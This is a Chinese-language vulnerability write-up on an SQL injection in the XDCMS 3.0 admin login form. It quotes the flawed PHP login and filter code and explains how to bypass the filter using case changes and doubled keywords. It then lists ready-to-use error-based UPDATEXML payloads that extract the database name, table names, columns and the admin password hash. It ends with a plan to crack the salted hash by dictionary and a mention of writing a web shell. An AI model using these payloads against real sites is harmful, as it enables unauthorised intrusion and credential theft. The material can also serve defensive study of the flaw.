XDCMS 3.0 后台登录窗sql注入漏洞
===============================

一、漏洞简介
------------

二、漏洞影响
------------

XDCMS 3.0

三、复现过程
------------

漏洞链

    system/modules/xdcms/login.php
    public function check(){
            
            $username = safe_html($_POST['username']);
            $password = safe_html($_POST['password']);
            $verifycode = safe_html($_POST['verifycode']);

            if(empty($username)||empty($password)){
                showmsg(C('user_pass_empty'),'-1');
            }
            
            if($verifycode!=$_SESSION['code']){
                showmsg(C('verifycode_error'),'-1');
            }
            
            $sql="select * from ".DB_PRE."admin where `username`='$username'";
            if($this->mysql->num_rows($sql)==0){
                showmsg(C('user_not_exist'),'-1');
            }
            
            $rs=$this->mysql->get_one($sql);
            $password=password($password,$rs['encrypt']);
            if($password!=$rs['password']){
                showmsg(C('password_error'),'-1');
            }
            
            if($rs['is_lock']==1){
                showmsg(C('user_lock'),'-1');
            }
            
            $logins=$rs["logins"]+1;
            $ip=safe_replace(safe_html(getip()));
            $this->mysql->db_update("admin","`last_ip`='".$ip."',`last_time`=".datetime().",`logins`=".$logins,"`username`='$username'");
            
            $_SESSION['admin']=$rs['username'];
            $_SESSION['admin_id']=$rs['id'];
            $_SESSION['groupid']=$rs['groupid'];
            unset($rs);
            showmsg(C("login_success"),"index.php?m=xdcms&c=index");
        }
    safe_html()
    function safe_html($str){
        if(empty($str)){return;}
        $str=preg_replace('/select|insert | update | and | in | on | left | joins | delete |\%|\=|\/\*|\*|\.\.\/|\.\/| union | from | where | group | into |load_file
    |outfile/','',$str);
        return htmlspecialchars($str);
    }

safe\_html()使用preg\_replace()时候，pattern未添加/i修饰符，导致过滤字符可通过大小写转换或双写进行绕过；

同时，htmlspecialchars()未添加参数，默认仅对双引号进行转义

**payload**

    #爆库
    username=admin%27+OR+UPDATExml(1,concat('~',(database())),0)--+&password=123&verifycode=3bdd&button=
    #爆表名
    username=admin%27+OR+UPDATExml(1,concat('~',(SELECT+group_concat(table_name)+frOm+information_scheMA.tables+whEre+table_schema+like+'xdcms')),0)--+&password=123&verifycode=3bdd&button=
    //updatexml一次显示32位字符，需要偏转
    username=admin%27+OR+UPDATExml(1,concat(0x7e,substr((SELECT+group_concat(table_name)+frOm+information_scheMA.tables+whEre+table_schema+like+'xdcms'),30,30)),0)--+&password=123&verifycode=3bdd&button=
    #爆表名
    username=admin%27+OR+UPDATExml(1,concat(0x7e,substr((SELECT+group_concat(column_name)+frOm+information_scheMA.columns+whEre+table_name+like+'c_admin'),1,32)),0)--+&password=123&verifycode=3bdd&button=
    #爆内容
    username=admin%27+OR+UPDATExml(1,concat(0x7e,(selEct+password+From+c_admin)),0)--+&password=123&verifycode=3bdd&button=

![](/Users/aresx/Documents/VulWiki/.resource/XDCMS3.0后台登录窗sql注入漏洞/media/rId24.jpg)

虽然获取密码hash值，但cms并未直接通过MD5获得哈希值，且无法破解该哈希值；

通过SQL注入获取到账户encrypt，再使用密码字典，依次爆破来猜测明文密码；另外可通过数据库写shell，但此时`secure_file_priv`被禁用

    function password($password, $encrypt='') {
        $pwd = array();
        $pwd['encrypt'] =  $encrypt ? $encrypt : get_random();
        $password_md5=md5(trim($password));
        $nums=strlen($password_md5) - strlen($pwd['encrypt']);//encrypt:lr24vx2
        $pwd['password'] = md5(substr_replace($password_md5,$pwd['encrypt'],$nums));
        return $encrypt ? $pwd['password'] : $pwd;
    }
